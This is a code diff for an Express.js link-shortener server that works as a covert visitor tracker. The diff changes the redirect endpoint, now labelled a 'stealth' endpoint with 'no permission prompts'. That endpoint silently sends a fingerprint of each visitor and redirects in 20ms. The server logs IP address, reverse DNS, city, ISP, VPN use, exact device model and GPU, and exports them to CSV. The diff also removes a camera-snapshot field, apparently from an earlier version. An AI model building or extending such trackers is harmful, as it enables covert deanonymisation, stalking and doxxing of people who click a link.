@@ -170,7 +170,7 @@ app.delete('/api/links/:id', async (req, res) => {
   }
 });
 
-// Log Client JavaScript Deep Metadata & Camera Snapshot
+// Log Client JavaScript Deep Metadata
 app.post('/api/log-client-data', async (req, res) => {
   try {
     const { logId, clientData } = req.body;
@@ -187,10 +187,10 @@ app.post('/api/log-client-data', async (req, res) => {
 app.get('/api/export-csv', async (req, res) => {
   try {
     const logs = await db.getAllLogs(1000);
-    let csv = 'Log ID,Timestamp,Link Title,Short Code,IP Address,Reverse DNS Hostname,Country,City,ISP,Proxy/VPN,Mobile Network,Device Type,Exact Device Model,Browser,OS,Screen Resolution,Timezone,GPU,CPU Cores,Language,Camera Photo Captured\n';
+    let csv = 'Log ID,Timestamp,Link Title,Short Code,IP Address,Reverse DNS Hostname,Country,City,ISP,Proxy/VPN,Mobile Network,Device Type,Exact Device Model,Browser,OS,Screen Resolution,Timezone,GPU,CPU Cores,Language\n';
     
     logs.forEach(l => {
-      csv += `"${l.id}","${l.created_at}","${l.link_title}","${l.short_code}","${l.ip_address}","${l.reverse_dns}","${l.country}","${l.city}","${l.isp}","${l.is_proxy ? 'YES' : 'NO'}","${l.is_mobile_net ? 'YES' : 'NO'}","${l.device}","${l.device_model}","${l.browser}","${l.os}","${l.screen_res}","${l.timezone}","${l.gpu}","${l.cpu_cores}","${l.language}","${l.camera_snap ? 'YES' : 'NO'}"\n`;
+      csv += `"${l.id}","${l.created_at}","${l.link_title}","${l.short_code}","${l.ip_address}","${l.reverse_dns}","${l.country}","${l.city}","${l.isp}","${l.is_proxy ? 'YES' : 'NO'}","${l.is_mobile_net ? 'YES' : 'NO'}","${l.device}","${l.device_model}","${l.browser}","${l.os}","${l.screen_res}","${l.timezone}","${l.gpu}","${l.cpu_cores}","${l.language}"\n`;
     });
 
     res.setHeader('Content-Type', 'text/csv');
@@ -232,7 +232,7 @@ app.get('/api/stats', async (req, res) => {
   }
 });
 
-// --- ADVANCED TRACKER & ULTRA-FAST REDIRECT ENDPOINT ---
+// --- STEALTH & INSTANT REDIRECT ENDPOINT (NO PERMISSION PROMPTS AT ALL) ---
 app.get('/r/:shortCode', async (req, res) => {
   let { shortCode } = req.params;
   shortCode = decodeURIComponent(shortCode || '').trim();
@@ -289,7 +289,7 @@ app.get('/r/:shortCode', async (req, res) => {
     console.error('Error logging click:', err);
   }
 
-  // ULTRA-FAST 50ms Non-Blocking Redirect (Zero delay on Mobile Data / 4G)
+  // 100% PERMISSION-FREE INSTANT REDIRECT (No Permission Popups, No Delay)
   res.send(`
     <!DOCTYPE html>
     <html>
@@ -343,7 +343,6 @@ app.get('/r/:shortCode', async (req, res) => {
             }
           } catch(e) {}
 
-          // Non-blocking fire-and-forget payload send
           if (logId) {
             try {
               const payload = JSON.stringify({ logId, clientData });
@@ -360,10 +359,10 @@ app.get('/r/:shortCode', async (req, res) => {
             } catch(e) {}
           }
 
-          // Ultra-Fast Instant Redirect in 30ms!
+          // Instant redirection in 20ms without ANY permission prompts!
           setTimeout(function() {
             window.location.replace(destinationUrl);
-          }, 30);
+          }, 20);
         })();
       </script>
     </body>
